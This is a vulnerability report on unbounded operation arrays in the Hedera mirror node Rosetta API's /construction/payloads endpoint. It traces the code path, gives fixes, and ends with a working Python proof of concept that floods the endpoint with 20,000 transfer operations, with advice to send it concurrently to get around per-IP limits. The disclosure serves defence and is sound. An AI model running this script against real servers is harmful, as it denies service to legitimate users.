### Title
Unbounded Operations Array in `ConstructionPayloads` Enables Resource Exhaustion DoS

### Summary
`ConstructionPayloads()` in `rosetta/app/services/construction_service.go` accepts a `ConstructionPayloadsRequest` with an arbitrarily large `Operations` array from any unauthenticated caller. Neither the application nor the HTTP server enforces a maximum operation count or request body size limit, allowing an attacker to force unbounded memory allocation in `getOperationSlice()` and unbounded CPU work in `cryptoTransferTransactionConstructor.preprocess()` and `Construct()`, exhausting server resources and denying service to legitimate users.

### Finding Description

**Exact code path:**

`ConstructionPayloads()` (`rosetta/app/services/construction_service.go`, lines 218–282) calls `getOperationSlice(request.Operations)` at line 232 with no prior bound check on `len(request.Operations)`.

`getOperationSlice()` (lines 432–465) does:
```go
operationSlice := make(types.OperationSlice, 0, len(operations))  // line 436
for _, operation := range operations { ... }                        // line 437
```
It allocates a slice sized to the attacker-controlled input and iterates every entry, performing account ID parsing (`types.NewAccountIdFromString`) and amount parsing (`types.NewAmount`) per element.

The result is passed to `c.transactionHandler.Construct()` (line 237), which routes to `cryptoTransferTransactionConstructor.preprocess()` (`rosetta/app/services/construction/crypto_transfer_transaction_constructor.go`, lines 120–161). This function is called with `validateOperations(operations, 0, ...)` at line 125 — the `size=0` argument explicitly disables any upper-bound check in `validateOperations()` (`rosetta/app/services/construction/common.go`, lines 118–142):
```go
if size != 0 && len(operations) != size {   // line 123 — never triggers when size==0
    return errors.ErrInvalidOperations
}
```
`preprocess()` then iterates all operations building `senderMap` and `totalAmounts` maps (lines 133–151), and `Construct()` (lines 33–52) calls `transaction.AddHbarTransfer()` for every entry.

**Root cause:** The application assumes the Rosetta SDK asserter or infrastructure-level Traefik middleware will bound input size. Neither provides an application-enforced ceiling on operation count, and no `http.MaxBytesReader` is set anywhere in the rosetta Go server.

**HTTP server:** `rosetta/main.go` lines 220–227 configure `ReadTimeout` (default 5 s) but set no `MaxBytesReader`. On a fast connection (e.g., 100 Mbps LAN or co-located attacker), 5 seconds is sufficient to deliver tens of megabytes of JSON containing thousands of operations.

**Traefik middleware** (`charts/hedera-mirror-rosetta/values.yaml`, lines 149–166) provides a rate limit of 10 req/s per host and 5 in-flight per IP, but: (a) it is conditionally applied only when `global.middleware` and `middleware` values are both set; (b) it is infrastructure-level and absent in bare-metal or direct-access deployments; (c) the rate limit is per `requestHost`, not per source IP, making multi-source attacks trivial.

### Impact Explanation
An attacker sending concurrent requests each containing tens of thousands of `CRYPTOTRANSFER` operations causes the Go server to allocate large slices and perform O(N) CPU work per request. With the 5-in-flight limit absent or bypassed via multiple source IPs, goroutine and memory exhaustion degrades or crashes the Rosetta API process. This prevents legitimate clients from constructing and submitting transactions through the mirror node's Rosetta interface, effectively blocking transaction routing to network nodes for the duration of the attack.

### Likelihood Explanation
No authentication or API key is required. The `/construction/payloads` endpoint is publicly reachable. A single attacker with a moderate-bandwidth connection can craft valid-looking `CRYPTOTRANSFER` operation arrays (each entry needs only a valid account address and a non-zero amount with balanced sum) and flood the endpoint. The attack is repeatable and scriptable with standard HTTP tooling.

### Recommendation
1. **Application-level operation count cap:** In `getOperationSlice()` (or at the top of `ConstructionPayloads()`), reject requests where `len(request.Operations)` exceeds a defined maximum (e.g., 50, matching the Hiero network's own transfer list limit of 10 accounts per side).
2. **HTTP body size limit:** Wrap the request body with `http.MaxBytesReader` in the server middleware or in the router setup (`rosetta/main.go`) to reject oversized payloads before JSON deserialization.
3. **Make Traefik middleware mandatory:** Ensure the `inFlightReq` and `rateLimit` middleware are enforced for all deployment configurations, not conditionally.

### Proof of Concept
```python
import requests, json

# Build a balanced transfer: N/2 senders of -1, N/2 receivers of +1
N = 20000
ops = []
for i in range(N // 2):
    ops.append({"operation_identifier": {"index": i*2},
                "type": "CRYPTOTRANSFER",
                "account": {"address": f"0.0.{1000+i}"},
                "amount": {"value": "-1", "currency": {"symbol": "HBAR", "decimals": 8}}})
    ops.append({"operation_identifier": {"index": i*2+1},
                "type": "CRYPTOTRANSFER",
                "account": {"address": f"0.0.{2000+i}"},
                "amount": {"value": "1", "currency": {"symbol": "HBAR", "decimals": 8}}})

payload = {
    "network_identifier": {"blockchain": "Hedera", "network": "testnet"},
    "operations": ops,
    "metadata": {
        "node_account_id": "0.0.3",
        "valid_until_nanos": "9999999999999999999"
    }
}

# Send concurrently from multiple threads to exhaust server goroutines/memory
resp = requests.post("http://<rosetta-host>:5700/construction/payloads",
                     json=payload, timeout=30)
print(resp.status_code, resp.text[:200])
```
Sending this request concurrently from several threads (bypassing the per-IP in-flight limit) will cause measurable CPU and memory spikes on the server, degrading response times for all other clients.